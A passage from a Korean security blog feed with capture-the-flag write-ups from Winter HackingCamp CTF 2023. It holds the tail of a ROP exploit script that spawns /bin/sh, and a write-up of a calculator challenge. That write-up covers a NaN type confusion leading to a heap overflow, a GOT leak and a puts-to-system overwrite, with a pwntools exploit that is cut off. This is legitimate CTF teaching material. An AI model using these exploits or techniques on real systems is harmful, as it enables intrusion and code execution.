class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line"><span class="comment"># p = remote(&#x27;3.38.2.179&#x27;, 1337)</span></span><br><span class="line">p = remote(<span class="string">&#x27;3.38.2.179&#x27;</span>, <span class="number">32860</span>)</span><br><span class="line"></span><br><span class="line">add_rax = <span class="number">0x40110e</span></span><br><span class="line">syscall = <span class="number">0x401113</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4011c1</span></span><br><span class="line">pop_rdi = <span class="number">0x4011c3</span></span><br><span class="line"></span><br><span class="line">csu_init = <span class="number">0x4011BA</span></span><br><span class="line">csu_call = <span class="number">0x4011A0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================== first main ====================</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(add_rax)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv(<span class="number">0x68</span>)</span><br><span class="line">stack = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">0x1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================== second main ====================</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read(0, 0x404028, 8)</span></span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(<span class="number">0x404028</span>) <span class="comment"># bss</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line"><span class="comment"># rdx = 0</span></span><br><span class="line">payload += p64(csu_init) <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># rbx</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># rbp</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># r12 (edi)</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># r13 (rsi)</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># r14 (rdx)</span></span><br><span class="line">payload += p64(stack - <span class="number">0x60</span>) <span class="comment"># [r15 + rbx*8] stack-0x60 = pop_rdi ...</span></span><br><span class="line"></span><br><span class="line">payload += p64(csu_call)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi) <span class="comment"># &lt;- stack-0x60 is here</span></span><br><span class="line">payload += p64(<span class="number">0x404028</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># rax = 0x3b</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x33</span>): <span class="comment"># rax = 0x8</span></span><br><span class="line">    payload += p64(add_rax)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execve(&#x27;/bin/sh\x00&#x27;, 0, 0)</span></span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HCAMP&#123;cf518127a07c471e00dcfca20a5ca08f&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Making </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hacking Camp </tag>
            
            <tag> SROP </tag>
            
            <tag> csu gagdet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Winter HackingCamp CTF 2023 - Super Calculator (Type Confusion)</title>
      <link href="/230211-hcamp2023w-super_calculator/"/>
      <url>/230211-hcamp2023w-super_calculator/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="http://hackingcamp.org/">http://hackingcamp.org/</a></li></ul><p>같은 Demon 팀의 수민님이 내신 문제다. 대회 전에 문제 검수하면서 스스로 풀어봤는데 이때까지 한 검수 중에서 세 손가락 안에 들 정도로 재밌는 문제여서 블로그에 꼭 기록하고 싶었다. 이 문제를 풀면서 디버깅을 굉장히 많이 하였다.. 미리 스포하자면 이 문제는 Chrome은 아니지만 Chrome 1-day와 관련있는데 나중에 시간이 난다면.. 관련 내용을 블로그에 적어 공유할까 싶기도 한다. (안 할 수도 있다.)</p><blockquote><p>Hello my name is Calculator</p></blockquote><ul><li>[ 1 solves &#x2F; 500 points]</li></ul><p>아래는 solve가 0일 때 나온 힌트이다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ref. 1day Vulnerbility : https://bugs.chromium.org/p/chromium/issues/detail?id=1315192 (type confusion lead to oob)</span><br><span class="line"></span><br><span class="line">Hint : Static_cast, C++, NaN, Infinity, Buffer Overflow</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>main 부터 살펴봤다. (분석하면서 call_num의 타입을 struct를 하나 새로 만들어서 지정해주었다.)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">v10 = <span class="number">0</span>;</span><br><span class="line">cal_num = <span class="built_in">malloc</span>(<span class="number">0x138</span>uLL);</span><br><span class="line">setup();</span><br><span class="line">v3 = cal_num;</span><br><span class="line">v3-&gt;_int32 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">v4 = cal_num;</span><br><span class="line">v4-&gt;_int33 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">v5 = cal_num;</span><br><span class="line">v5-&gt;_int34 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>); <span class="comment">//</span></span><br><span class="line">v6 = cal_num;</span><br><span class="line">v6-&gt;_float35 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">v7 = cal_num;</span><br><span class="line">v7-&gt;_float36 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">v8 = cal_num;</span><br><span class="line">v8-&gt;_float37 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>); <span class="comment">//</span></span><br></pre></td></tr></table></figure><p><code>setup()</code> 함수는 안봐도 되는 함수다. 스포를 하자면 <code>*cal_num-&gt;_int34</code>와 <code>*cal_num-&gt;_float37</code>을 주시해야 한다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">    Banner();</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v10);</span><br><span class="line">    <span class="keyword">switch</span> ( v10 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        Interger_cal();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        Real_cal();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        overflow();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        Number_change();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        Print_number();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        Print_Note();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[E]rror&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>기능이 6가지가 있으며 내가 적은 숫자에 따라 각 기능이 실행된다. 일단 취약점을 찾아야 하니까 취약점일 것 같은 것들 위주로 빠르게 살펴봤다. 처음에 하나하나씩 빠르게 열어보고 세 번째 기능 함수를 보고 다시 첫 번째와 두 번째 함수를 살펴봤다.</p><p>세 번째 기능 함수는 <code>overflow</code> 날 것 같이 생겨서 보자마자 <code>overflow</code>로 함수 명을 바꾸어주었다. (ctf니까 여기서 overflow가 나야 뭔갈 할 수 있겠다고 생각했다.)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">overflow</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)cal_num-&gt;_int34 || *cal_num-&gt;_float37 != <span class="number">0.0</span> )</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, cal_num, *(<span class="type">unsigned</span> <span class="type">int</span> *)cal_num-&gt;_int34);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;[E]rror&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Interger_cal()</code>함수에서는 취약점일 것처럼 생긴게 안보였다. 하나 특징이 있다면 한 수식을 사용자로부터 입력받고 그 수식에 대한 연산을 진행하는데 연산 결과가 <code>*cal_num-&gt;_int34</code>에 담긴다는 것이다. <code>int</code> 연산 결과가 <code>int</code> 타입의 변수에 담기고 음수 연산도 잘 예외처리가 되어있어서 일단 넘어갔다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">Real_cal</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s1; <span class="comment">// [rsp+7h] [rbp-9h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Real cal&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *cal_num-&gt;_float37 == <span class="number">0.0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%1f %c %1f&quot;</span>, cal_num-&gt;_float35, &amp;s1, cal_num-&gt;_float36);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, s2) )</span><br><span class="line">    <span class="comment">// ..</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, &amp;s2[<span class="number">2</span>]) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *cal_num-&gt;_float35 &lt; *cal_num-&gt;_float36 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[E]rror&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      *(_DWORD *)cal_num-&gt;_int34 = (<span class="type">int</span>)(<span class="type">float</span>)(*cal_num-&gt;_float35 - *cal_num-&gt;_float36); <span class="comment">// [*]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, &amp;s2[<span class="number">4</span>]) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *cal_num-&gt;_float35 &lt; *cal_num-&gt;_float36 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[E]rror&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      *cal_num-&gt;_float37 = *cal_num-&gt;_float35 / *cal_num-&gt;_float36; <span class="comment">// [**]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// ..</span></span><br><span class="line">    &#125;</span><br><span class="line">    Print_Note();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Result : %f&quot;</span>, *cal_num-&gt;_float37);</span><br><span class="line">    Number_Check(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Result : %f\n&quot;</span>, *cal_num-&gt;_float37);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>[*]</code> 를 보자. 처음에 이 함수를 보고 저기서 무조건 타입 컨퓨젼이 날 것이라 생각했다. 왜냐면 float 연산 결과를 int에 담으면 매우매우 큰 수가 담기기 떄문이다. 하지만 내가 <code>scanf(&quot;%1f %c %1f&quot;, cal_num-&gt;_float35, &amp;s1, cal_num-&gt;_float36);</code> 이 구문을 잘못 이해하고 있었다. <code>%1f</code>의 이미는 정수형으로 한 자리만 입력받겠다는 것을 의미한다. 나는 소수점 한자리인 줄 알고 디버깅해보면서 의문이 너무나 많았다.</p><p>참고로 <code>float</code> 연산을 한다는 것은 어셈블리를 보고 바로 파악할 수 있었다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400F0D                 mov     rax, cs:_ZL7cal_num._int ; cal_num</span><br><span class="line">.text:0000000000400F14                 mov     rax, [rax+110h]</span><br><span class="line">.text:0000000000400F1B                 cvttss2si rdx, xmm0</span><br><span class="line">.text:0000000000400F20                 mov     [rax], edx</span><br></pre></td></tr></table></figure><p><code>cvttss2si</code> 와 같은 (나에게 상대적으로 덜 익숙한) 어셈블리 연산은 <code>float</code> 연산에서 사용하기 때문이다.</p><p>그리고 <code>Number_change</code>라는 수상한 함수가 보여서 바로 확인했다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> *<span class="title function_">Number_change</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint64_t</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  LODWORD(cal_num-&gt;_float38) = *cal_num-&gt;_int34;</span><br><span class="line">  *cal_num-&gt;_int34 = *cal_num-&gt;_float37; <span class="comment">// [*]</span></span><br><span class="line">  *cal_num-&gt;_float37 = SLODWORD(cal_num-&gt;_float38); </span><br><span class="line">  result = *cal_num-&gt;_int34;</span><br><span class="line">  <span class="keyword">if</span> ( result &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = cal_num-&gt;_int34;</span><br><span class="line">    --*result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>대놓고 <code>float</code> 타입의 값을 <code>int</code> 타입의 변수로 옮겨준다. 여기서 <code>type confusion</code>이 발생할 가능성이 있다. 그러나.. <code>float</code> 연산을 하던 <code>Real_cal</code> 함수에서는 정수 한자리로 계산하기 때문에 무의미하다고 생각했다. 여기서 오랜 시간 고민을 하다가 예전에 <code>Chrome 1-day</code> 분석했던 것이 떠올랐다. 정확히 뭔지는 기억 안나는데 연산 결과가 <code>NaN</code>이 나와서 <code>OOB</code>가 발생하는 취약점이 있었다. <code>NaN</code>은 <code>0/0</code>같은 것을 하면 나온다. <code>Not a Number</code>라는 뜻이다. </p><p>아무튼 바로 아래 로직으로 테스트를 진행했고 <code>overflow</code>를 트리거 할 수 있었다.</p><ol><li><code>Real_Cal</code>에서 <code>0/0</code> 입력</li><li><code>Number_Change</code> 함수 -&gt; 여기서 float의 <code>NaN</code>이 int로 넘어가는데 0보다 작기 때문에 문제 로직에 따라 -1을 함</li><li><code>overflow</code> 함수를 통해 <code>overflow</code> 발생 -&gt; -1은 <code>read</code> 세 번째 인자로 들어가면서 <code>unsigned int</code>로 형변환되기 때문에 매우 큰 수가 되어 <code>overflow</code>가 발생한다.</li></ol><p>해당 과정은 디버깅을 하면서 이해하였다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>취약점 트리거도 꽤 고생을 했는데 익스할 때도 고생을 조금 했다. <code>OOB</code>가 발생하는데 leak도 해야하고 어떠한 함수의 got를 system 함수로 덮어야하고 어딘가에 ‘&#x2F;bin&#x2F;sh\x00’ 써야하는데 어디에 쓰지.. 란 생각이 동시에 들어서 혼란스러웠다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Print_number</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Print Number&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Num 1. %d\n&quot;</span>, *cal_num-&gt;_int32);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Num 2. %d\n&quot;</span>, *cal_num-&gt;_int33);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Result %d\n&quot;</span>, *cal_num-&gt;_int34);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Float Num 1. %f\n&quot;</span>, *cal_num-&gt;_float35);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Float Num 2. %f\n&quot;</span>, *cal_num-&gt;_float36);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Float Result %f\n&quot;</span>, *cal_num-&gt;_float37);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>하지만 main의 6가지 기능 중에 이런 것이 있었고, 나는 현재 <code>cal_num</code>에 overflow를 발생시켜 입력을 할 수 있으니 위에 보이는 저 값 즉, <code>*cal_num-&gt;_int32</code>나 <code>*cal_num-&gt;_int33</code>와 같은 값들을 덮을 수 있다. 이 기능을 이용하여 libc leak을 할 수 있다. 주의해야할 점은 이게 int라서 4바이트씩 끊어져서 leak이 된다. 하위 4바이트 출력값이 때로 음수가 될 때도 있어서 0보다 이상일 때만 걸러주었다. 아니면 그냥 예외를 강제로 발생시켜 다시 연결하였다. </p><p>이런식으로 <code>libc base</code>를 정상적으로 구할 수 있고 이제 <code>어떠한 함수</code>를 <code>system</code> 함수로 덮어야 한다. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Print_Note</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(cal_num);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>기능 중에 이런 기능이 있었고, <code>puts</code> 함수를 <code>system</code> 함수로 덮고 <code>cal_num</code>이 우리 입력값이니까 ‘&#x2F;bin&#x2F;sh\x00’을 쉽게 넣어 쉘을 따자고 생각했다. 재밌게도 이 함수는 <code>Interger_cal</code> 함수가 종료될 떄 쯤 호출이 된다. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*cal_num-&gt;_int34 = *cal_num-&gt;_int32 + *cal_num-&gt;_int33;</span><br></pre></td></tr></table></figure><p><code>Interger_cal</code> 함수 상단에선 사용자 입력에 따라 이러한 연산을 수행한다. 이걸 이용하여 <code>puts@got</code>를 <code>system</code> 함수로 덮을 수 있겠다고 생각했다. 먼저 <code>overflow</code> 함수에서 피 연산자 두 개에 <code>puts@got</code>를 4바이트씩 잘라서 넣어놓고 <code>Interger_cal</code> 함수에서 <code>puts@got</code>에다가 값을 쓸 수 있다. 이 때 중요한 것은 4바이트씩 잘 잘라서 넣어줘야한다는 것이다. 그럼 이제 쉘을 획득할 수 있다.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;3.38.2.179&#x27;</span>, <span class="number">40020</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = e.libc</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;0 / 0&#x27;</span>) <span class="comment"># nan</span></span><br><span class="line"></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>)) <span class="comment"># float -&gt; int</span></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>)) <span class="comment"># overflow</span></span><br><span class="line"></span><br><span class="line">        payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x100</span></span><br><span class="line">        payload += p64(e.got[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">        payload += p64(e.got[<span class="string">&#x27;printf&#x27;</span>]+<span class="number">4</span>)</span><br><span class="line">        p.send(payload)</span><br><span class="line"></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>)) <span class="comment"># leak</span></span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">&#x27;Num 1.&#x27;</span>)</span><br><span class="line">        got1 = <span class="built_in">int</span>(p.recvline(), <span class="number">10</span>)</span><br><span class="line">        info(<span class="built_in">hex</span>(got1))</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;Num 2.&#x27;</span>)</span><br><span class="line">        got2 = <span class="built_in">int</span>(p.recvline(), <span class="number">10</span>) <span class="comment"># 7f??</span></span><br><span class="line">        info(<span class="built_in">hex</span>(got2))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> got1 &gt; <span class="number">0</span>:</span><br><span class="line">            leak = <span class="built_in">hex</span>(got2) + <span class="built_in">hex</span>(got1)[<span class="number">2</span>:]</span><br><span class="line">            info(<span class="string">&#x27;leak : &#x27;</span> +leak)</span><br><span class="line">            libc.address = <span class="built_in">int</span>(leak, <span 